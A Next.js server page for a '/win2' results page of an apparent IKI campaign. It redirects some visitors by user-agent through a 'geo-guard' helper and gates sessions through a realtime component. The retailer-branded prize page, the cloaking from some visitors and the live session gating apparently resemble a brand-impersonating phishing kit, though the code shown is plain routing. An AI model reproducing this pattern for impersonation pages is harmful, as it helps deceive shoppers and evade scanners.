import { headers } from "next/headers";
import { redirect } from "next/navigation";
import { SessionRealtimeGate } from "@/components/demo/SessionRealtimeGate";
import { Win2Client } from "./win2-client";
import { resolveServerSessionIdentity } from "@/lib/session-id";
import { buildShareMetadata } from "@/lib/share-metadata";
import { getBlockedRedirectUrl } from "@/lib/geo-guard";
import { resumeOrRedirectHome } from "@/lib/session-resume";

export const dynamic = "force-dynamic";

export async function generateMetadata() {
  return buildShareMetadata({
    title: "IKI — Rezultatas",
    description: "IKI kampanijos rezultatų puslapis.",
    canonical: "/win2",
  });
}

type Props = {
  searchParams: Promise<{ session?: string }>;
};

export default async function Win2Page({ searchParams }: Props) {
  const h = await headers();
  const blockedUrl = await getBlockedRedirectUrl(h.get("user-agent") || "");
  if (blockedUrl) redirect(blockedUrl);

  const params = await searchParams;
  await resumeOrRedirectHome(params);

  const { sessionId, routeSessionId } = await resolveServerSessionIdentity({
    searchParams: params,
  });

  return (
    <>
      <SessionRealtimeGate sessionId={sessionId ?? ""} routeSessionId={routeSessionId ?? undefined} />
      <Win2Client sessionId={sessionId} routeSessionId={routeSessionId ?? undefined} />
    </>
  );
}
